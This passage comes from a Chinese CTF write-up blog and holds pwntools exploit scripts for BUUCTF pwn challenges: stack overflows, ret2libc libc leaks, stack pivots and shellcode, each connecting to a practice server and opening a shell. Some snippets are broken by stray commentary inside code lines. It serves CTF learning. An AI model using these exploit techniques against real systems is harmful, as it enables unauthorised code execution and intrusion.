al</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0x308CD64F</span> &amp;&amp; a2 == <span class="number">425138641</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">fopen</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">    v3 = <span class="built_in">getc</span>(v2);</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">255</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = (<span class="type">char</span>)v3;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(v4);</span><br><span class="line">        v5 = <span class="built_in">getc</span>(v2);</span><br><span class="line">        v4 = (<span class="type">char</span>)v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v5 != <span class="number">255</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fclose</span>(v2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>get_flag()有两个参数，a1和a2。这里我已经将a1和a2转换成了十六进制。if对a1和a2进行了一个判断，符合条件后进行对flag的读取。具体读取过程为：首先v2对flag.txt文件进行一个读取，v3用getc()来接收v2读取的值(getc():从指定的流stream获取下一个字符(一个无符号字符)，并把位置标识符往前移动)。在v3不为255时，将值传给v4，用中间变量v5来读取v2的值，并且在v5不为255时，将v5的值赋给v4并输出v4，最终输出的结果就是flag</p>
<p>但是我们发现通过main()的stackoverflow单纯的跳到get_flag()这个函数是无法拿到flag的，这里是因为我们在stackoverflow时覆盖了a1和a2，破坏了输出flag的条件，从而无法得到flag。我们试想，如果我们在stackoverflow时保护了栈结构，使程序达到输出flag的条件，正常退出，是否就可以拿到flag？</p>
<p>于是我们需要<code>exit()</code>的地址，以及满足条件的a1和a2的值，即<code>0x308CD64F</code>和<code>0x195719D1</code></p>
<p><strong>exp</strong></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span> , arch = <span class="string">&quot;i386&quot;</span> , log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27026</span>)</span><br><span class="line">ret = <span class="number">0x08048196</span></span><br><span class="line">exits = elf.sym[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;got exit addr : %s&quot;</span> % <span class="built_in">hex</span>(exits))</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x38</span> + p32(<span class="number">0x080489A0</span>) + p32(exits) + p32(<span class="number">0x308CD64F</span>)+ p32(<span class="number">0x195719D1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Qual a palavrinha magica? &quot;</span> , timeout = <span class="number">0.5</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>先checksec一下，nx排除了shellcode的可能，Full RELEO为地址随机化</p>
<p>先观察主函数，设定了一个闹钟(但是这道题不需要使用解除闹钟的方法)</p>
<p><img src="/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-13%20095347-1678706371578-4.png"></p>
<p>主函数的思路是生成一个随机数，把这个随机数作为参数传进sub——804871F()函数中，然后再将函数返回结果作为参数传进sub——80487D0()里,sub_80486bb()是初始化，没什么用。<strong>fd&#x3D;open(“&#x2F;dev&#x2F;urandom”,0);if(fd&gt;0) read(fd,&amp;buf,4u)</strong>:获取一个随机数给到buf</p>
<p><strong>sub_804871f()</strong></p>
<p><img src="/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-13%20095410.png"></p>
<p>sprintf函数将生成的随机数加到s[32]的数组中，这里题目有read函数，但是没有栈溢出的可能，读入buf之后，读取buf的长度，然后比较buf和s字符串的大小（比较长度为前v1个字符）。此时如果strncmp（）的结果不为0，则直接退出程序。因此我们第一个目的：<strong>使strncmp结果为0</strong></p>
<p><strong>sub_80487d0()</strong></p>
<p><img src="/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-13%20095400.png"></p>
<p>这个函数将buf[7]作为参数出传进来，将它的ASCII码比对，看到全程序中唯一一个存在栈溢出漏洞可能性的地方。但是必须满足a1的ASCII码值能达到栈溢出的大小。第二个目的：<strong>使a1的ASCII码值（sub_804871F()函数里的buf[7]的ASCII码值尽量大）</strong></p>
<p><strong>思路</strong></p>
<p>使用ROP链寻找libc解题</p>
<p>首先让strncmp结果为零，当buf与s数组完全相同时，strncmp结果会为0，但是s为系统生成的随机数，而buf是我们输入的数据，两者显然不可能相等。另一种办法就是<strong>使v1等于0，这样strncmp的结果仍为0。</strong>而v1是strlen函数读取buf的长度大小，使他为0就很简单了，标准的长度检测绕过，让buf数组的第一位为<strong>‘\x00’</strong>即可。此时程序不会退出</p>
<p>然后让buf[7]的值尽可能大，要实现栈溢出，buf[7]元素的ASCII码值必须大于两百四十多才行，所以要使用转义字符的ASCii码，’&#39;为转义字符，而’\xhh‘表示ASCII码值与’hh’这个十六进制数相等的符号，例如’\xff’表示ASCII码为255的符号。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25352</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;i386&quot;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]<span class="string">&#x27;&#x27;&#x27;选择用write函数泄露libc地址&#x27;&#x27;&#x27;</span></span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">main_func = <span class="number">0x08048825</span></span><br><span class="line">payload1 = <span class="string">b&quot;\x00&quot;</span>长度检测绕过+ <span class="string">b&quot;\xff&quot;</span>*<span class="number">7</span>让buf[<span class="number">7</span>]的值尽可能大,\为转义字符，而’\xhh‘表示ASCII码值与’hh’这个十六进制数相等的符号，例如’\xff’表示ASCII码为<span class="number">255</span>的符号。</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvline()</span><br><span class="line">payload2 = flat([<span class="string">b&quot;a&quot;</span>*<span class="number">0xE7</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">4</span>,write_plt,main_func,<span class="number">1</span>,read_got,<span class="number">0x8</span>])</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">read_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(read_addr)</span><br><span class="line">libcbase = read_addr - libc.symbols[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"><span class="comment">#print libcbase</span></span><br><span class="line">system_addr = libcbase + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(binsh)</span><br><span class="line">payload3 = flat([<span class="string">b&quot;a&quot;</span>*<span class="number">0xe7</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">4</span>,system_addr,<span class="number">0</span>,binsh])</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure>



<h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">ret = <span class="number">0x4006b9</span>      <span class="comment">#靶机是ubuntu，所以需要栈平衡</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn1&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>] </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span>      <span class="comment">#×64程序基本都存在的一个地址pop rdi；ret</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25016</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">payload = payload + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">	<span class="built_in">print</span>(payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)	</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">7</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(puts_addr)      <span class="comment">#找出puts的地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base   = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)      <span class="comment">#找出函数地址偏移量</span></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)      <span class="comment">#计算出system的在程序中的地址</span></span><br><span class="line">binsh_addr  = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)	</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">payload = payload + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&quot;./not_the_same_3dsctf_2016&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28787</span>)</span><br><span class="line">io = process(<span class="string">&quot;./not_the_same_3dsctf_2016&quot;</span>)</span><br><span class="line">backdoor_addr = <span class="number">0x080489A0</span></span><br><span class="line">str_flag_addr = <span class="number">0x080ECA2D</span></span><br><span class="line">printf_addr = <span class="number">0x0804F0A0</span></span><br><span class="line">write_addr = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">exit_addr = elf.symbols[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">这个main函数没有push ebp 所以不用再覆盖<span class="number">4</span>字节的ebp</span><br><span class="line">payload = <span class="number">0x2D</span> * <span class="string">b&#x27;a&#x27;</span> + p32(backdoor_addr) + p32(write_addr) + p32(exit_addr) + p32(<span class="number">1</span>) + p32(str_flag_addr) + p32(<span class="number">45</span>)<span class="comment">#覆盖了栈，没有覆盖ebp，原因是不存在ebp，字符串空间的底部就是函数的返回地址覆盖返回地址，返回到get_secret函数从get_secret函数返回到write函数#exit位置是write的返回的值，没什么用，随便填</span></span><br><span class="line">payload += p32(<span class="number">1</span>)           <span class="comment"># write函数的第一个参数，是 文件描述符；</span></span><br><span class="line">payload += p32(flagaddr)    <span class="comment"># write函数的第二个参数，是 存放字符串的内存地址；</span></span><br><span class="line">payload += p32(<span class="number">42</span>)          <span class="comment"># write函数的第三个参数，是 打印字符串的长度</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>



<h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn4&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25661</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name\n&#x27;</span>,shellcode)</span><br><span class="line">payload=flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x601080</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;me?\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25020</span>)</span><br><span class="line">main_addr      = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">plt_write_addr = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">got_write_addr = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload        = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(plt_write_addr) + p32(main_addr) + p32(<span class="number">1</span>) + p32(got_write_addr) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr     = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">lib             = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">lib_write_addr  = lib.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">lib_system_addr = lib.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">lib_bin_addr    = lib.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">base_addr       = write_addr - lib_write_addr</span><br><span class="line">system_addr     = base_addr  + lib_system_addr</span><br><span class="line">bin_addr 	= base_addr  + lib_bin_addr</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(system_addr) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(bin_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28646</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn6&#x27;</span>)</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_ret=<span class="number">0x400733</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line"></span><br><span class="line">这里需要注意一下payload64位先往寄存器中传参顺序要注意！！！ </span><br><span class="line">r.recvuntil(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recv()</span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)   </span><br><span class="line">system = libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)   </span><br><span class="line">bins = libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span>+p64(pop_ret)+p64(bins)+p64(system)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">elf=ELF(<span class="string">&#x27;pwn7&#x27;</span>)</span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28553</span>)</span><br><span class="line">back_addr=elf.symbols[<span class="string">&#x27;backdoor&#x27;</span>]</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(back_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;i386&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;pwn8&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29794</span>)</span><br><span class="line">sys_addr=<span class="number">0x08048400</span></span><br><span class="line">leave_addr=<span class="number">0x8048562</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x27</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name?\n&#x27;</span>,payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">ebp=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(sys_addr)+p32(<span class="number">0</span>)+p32(ebp-<span class="number">0x28</span>)+<span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">payload2+=p32(ebp-<span class="number">0x38</span>)看当时的ebp+p32(leave_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">整数溢出问题</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29476</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn9&#x27;</span>)</span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">vuln=<span class="number">0x0804852f</span></span><br><span class="line">main=<span class="number">0x080485b8</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;read?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;data!\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p32(printf_plt)+p32(vuln)+p32(printf_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">printf_add=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf_add))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_add)</span><br><span class="line">libc_base=printf_add-libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;read?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;data!\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p32(system)+p32(main)+p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">32</span>位ret2libc</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">conn = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25837</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x0804844B</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">&quot;Input:\n&quot;</span>,payload)</span><br><span class="line">write_addr = u32(conn.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span> + p32(system_addr) + p32(main_addr) + p32(bin_sh)</span><br><span class="line">conn.sendlineafter(<span class="string">&quot;Input:\n&quot;</span>,payload)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#start</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25683</span>) </span><br><span class="line">r = process(<span class="string">&quot;../buu/[HarekazeCTF2019]baby_rop2&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;babyrop2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">rdi_addr = <span class="number">0x400733</span></span><br><span class="line">rsi_r15_addr = <span class="number">0x400731</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">format_str = <span class="number">0x400770</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attack</span></span><br><span class="line">payload=<span class="string">b&#x27;M&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(rdi_addr) + p64(format_str) + p64(rsi_r15_addr) + p64(read_got) + p64(<span class="number">0</span>) + p64(printf_plt) + p64(main_addr)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(payload)</span><br><span class="line">read_addr = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;read_addr: &quot;</span> + <span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc</span></span><br><span class="line">base_addr = read_addr - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr = base_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = base_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system_addr: &quot;</span> + (<span class="built_in">hex</span>(system_addr)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bin_sh_addr: &quot;</span> + (<span class="built_in">hex</span>(bin_sh_addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack2</span></span><br><span class="line">payload=<span class="string">b&#x27;M&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(rdi_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="2021-鹤城杯-littleof"><a href="#2021-鹤城杯-littleof" class="headerlink" title="[2021 鹤城杯]littleof"></a>[2021 鹤城杯]littleof</h2><p><strong>checksec一下</strong></p>
